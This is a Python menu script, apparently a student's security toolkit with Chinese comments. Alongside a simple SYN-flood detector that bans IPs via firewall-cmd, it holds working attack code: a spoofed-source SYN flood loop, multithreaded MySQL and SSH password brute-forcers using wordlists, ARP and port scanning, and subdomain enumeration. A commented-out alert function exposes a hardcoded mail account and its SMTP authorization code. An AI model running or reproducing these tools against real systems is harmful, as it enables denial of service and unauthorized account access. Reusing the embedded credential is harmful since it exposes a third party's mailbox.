# 直接导入内置模块
import smtplib
# email模块主要处理邮件的头和正文等数据
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import paramiko as paramiko
import pymysql
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
from scapy.sendrecv import sr1

success = False
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def conn_count():
    # 查看当前SYNC_REC连接数量
    counts = os.popen('netstat -np | grep SYN_REC | wc -l').read()
    return counts

def Cpu_query():
    # CPU在1分钟内的平均负载
    Cpu = os.popen("uptime | awk -F ': ' '{print $2}' | awk -F ',' '{print $1}'").read()
    return Cpu


# # 采集队列长度
# def get_queue_size():
#     # ss -lnt | grep :80 | awk '{print $3}'
#     sslnt = os.popen("ss -lnt | grep :80").read()
#     recvq = int(sslnt.split()[1])
#     sendq = int(sslnt.split()[2])
#     return recvq, sendq

# 获取实时带宽
def band_Width():
    res = 0
    unit = "Bytes"  # 定义默认单位
    for i in range(5):
        # 获取发送的数据总量
        data_1 = int(os.popen("ifconfig | head -n 7 | tail -n 1 | awk '{print $5}'").read().strip())
        data_2 = int(os.popen("ifconfig | head -n 7 | tail -n 1 | awk '{print $5}'").read().strip())
        # 实时带宽
        bw = data_2 - data_1
        res += bw
    res = res / 5  # 求平均值
    bandw = res  # 保存原先的bytes大小
    return bandw


# 防火墙对IP进行封禁
def firewall_ip():
    # 查看每个ip跟服务器建立的连接数
    # 显示第5列,-F : 以：分割，显示列，sort 排序，uniq -c统计排序过程中的重复行，sort -rn 按纯数字进行逆序排序
    ip = os.popen(
        "netstat -nat|grep :80|awk '{print$5}'|awk -F : '{print$1}'|uniq -c|sort -rn |awk 'NR==1''{print $2}'").read()
    # 添加防火墙规则，封禁dos攻击的IP
    denfes = os.popen(f'firewall-cmd --add-rich-rule="rule family=ipv4 source address={ip} drop" ').read()
    if denfes.strip() == "success":
        print(f"{ip} IP已经封禁。")
    else:
        print(f"{ip} 没有封禁成功！")

    # 报警邮箱


# def mail_qq():
# # 定义发件人和收件人
#     sender = '457364071@qq.com'  # 发送邮箱
#     receiver = '572444727@qq.com'  # 接收邮箱

#     # 构建邮件的主体对象
#     msg = MIMEMultipart()
#     msg['Subject'] = '警告！！！警告！！！'
#     msg['From'] = sender
#     msg['To'] = receiver
#     body = '''
#     TCP连接过多，CPU超过2.0,疑似有DDos攻击。
#     '''
#     content = MIMEText(body, 'html', 'utf-8')
#     msg.attach(content)

#     # 建立与邮件服务器的连接并发送邮件
#     smtpObj = smtplib.SMTP_SSL('smtp.qq.com', 465)
#     smtpObj.login(user='457364071@qq.com', password='sjlactmiwqtdcaaa')
#     smtpObj.sendmail(sender, receiver, str(msg))
#     smtpObj.quit()

##IDS
def dos_ids():
    while True:
        conn = conn_count()
        cpu = Cpu_query()
        #  recvq, sendq = get_queue_size()
        band = band_Width()  # 实时带宽
        print(f"TCP连接数: {conn},CPU负载: {cpu},带宽：{band}MB")

        # 对采集到的数据进行判断，并进行预警提醒
        if int(conn) > 200 and float(cpu) > 2.0 and band < 100:
            print("TCP连接过多，CPU超过2.0,疑似有DDos攻击")
            firewall_ip()
            # mail_qq()
        opt  = input("是否回到上一级目录（d）：")
        if opt == "d":
            break


###################################试探#######################################

def scapy_arp(start):  # arp局域网主机扫描


        psrcs = os.popen("ifconfig | awk 'NR==2''{print $2}'").read()
        a = psrcs.split('.')
        for i in range(start, start + 10):
            pdsts = a[0] + '.' + a[1] + '.' + a[2] + '.' + str(i)
            try:
                pkg = ARP(psrc=psrcs, pdst=pdsts)
                reply = sr1(pkg, timeout=2, verbose=False)  # 去除提示
                print(reply[ARP].hwsrc)
                print(f"{pdsts}在线")
            except:
                pass


# 多线程
def Arp_threads():
    for i in [x for x in range(1, 256, 10)]:
        t = threading.Thread(target=scapy_arp, args=(i,))
        t.daemon = True
        t.start()
        time.sleep(1)
        # opt = input("是否回到上一级目录（d）：")
    # if opt == "d":
    #     break


# 常用端口扫描
def scan_port():
    ip = input("请输入需要扫描的IP地址：")
    list = [7, 21, 22, 23, 25, 43, 53, 67, 68, 69, 79, 80, 81, 88, 109, 110, 113, 119, 123, 135, 135,
            137, 138, 139, 143, 161, 162, 179, 194, 220, 389, 443, 445, 465, 513, 520, 520, 546, 547,
            554, 563, 631, 636, 991, 993, 995, 1080, 1194, 1433, 1434, 1494, 1521, 1701, 1723, 1755,
            1812, 1813, 1863, 3269, 3306, 3316, 3389, 3544, 4369, 5060, 5061, 5355, 5432, 5671, 5672, 6379,
            7001, 8080, 8081, 8088, 4433, 8443, 8883, 8888, 9443, 9988, 9988, 15672, 50389, 50636, 61613, 61614]
    for port in list:
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((f'{ip}', port))
            print(f"开放端口：{port}")
            s.close()
        except:
            pass
    menu()

# syn泛洪攻击
# TCP
def syn_dos():
    ip = input("请输入要攻击的主机IP：")
    ports = input("请输入要攻击的端口：")
    srclist = ['192.168.2.1', '192.168.23.12', '192.168.123.1','192.168.122.1','192.168.23.2']
    while True:
        index = random.randint(0, 2)
        source_port = random.randint(1024, 65535)  # 随机产生源端口
        init_sn = random.randint(1, 65535 * 63335)  # 随机产生初始化序列号
        # 发生syn包
        send(IP(src=srclist[index],dst=ip) / TCP(dport=int(ports), sport=source_port, flags=2, seq=init_sn), verbose=False)


# mysql爆破
def crack_force_mysql(users_list, host):
    global success
    port = 3306
    charset = 'utf8'
    with open('top500.txt') as pf:  # 密码字典
        pass_list = pf.readlines()
        for username in users_list:
            for password in pass_list:  # 遍历账号密码数据库
                    if not success:
                        try:
                            con = pymysql.connect(host=host, port=port, user=username.strip(),
                                                  password=password.strip(),
                                                  charset=charset)  # mysql
                            print(f"数据库账号：{username.strip()}数据库密码：{password.strip()}")
                            success = True
                            exit()
                        except:
                            pass
                    else:
                        exit()


def mysql_thread():  # mysql多线程爆破
    host = input("输入爆破主机:")
    with open('user500.txt') as uf:
        user_list = uf.readlines()

    for i in range(0, len(user_list), 10):  # 10个用户range(start,stop，[,step])
        users_list = user_list[i:i + 10]
        threading.Thread(target=crack_force_mysql, args=(users_list, host)).start()


# ssh爆破
def ssh_crack():
    global success
    ip = input("输入主机IP：")
    with open('./usersdict/top500.txt') as uf:
        user_list = uf.readlines()
    with open('./usersdict/top500.txt') as file:
        pw_list = file.readlines()
    for username in user_list:
        for password in pw_list:
            try:
                if success == False:
                    transport = paramiko.Transport((ip, 22))
                    transport.connect(username=username.strip(), password=password.strip())
                    print(f"爆破成功，账号为：{username.strip()}密码为：{password.strip()}")
                    success = True
                    sys.exit(0)
            except Exception as e:
                pass
                if success == True:
                    sys.exit(0)


# 子域名查询
def domain_scan():
    url = input("输入查询的网址：")
    with open('dic1.txt') as f:
        line_list = f.readlines()  # 字典

    for domain in line_list:
        try:
            ip = socket.gethostbyname(f'{domain.strip()}.{url}')
            print(f'{domain.strip()}.{url}----{ip}')
        except:
            pass


def menu():
    print('1) ids')
    print('2) 探测主机是否存活')
    print('3) 常用端口扫描')
    print('4) syn泛洪攻击')
    print('5) mysql爆破')
    print('6) ssh爆破')
    print('7) 附加功能，子域名查询')
    task = input('请输入你的选项： ')

    if task == '1':
        dos_ids()
    elif task == '2':
        Arp_threads()
    elif task == '3':
        scan_port()
    elif task == '4':
        syn_dos()
    elif task == '5':
        mysql_thread()
    elif task == '6':
        ssh_crack()
    elif task == '7':
        domain_scan()


if __name__ == '__main__':
    while True:
        menu()

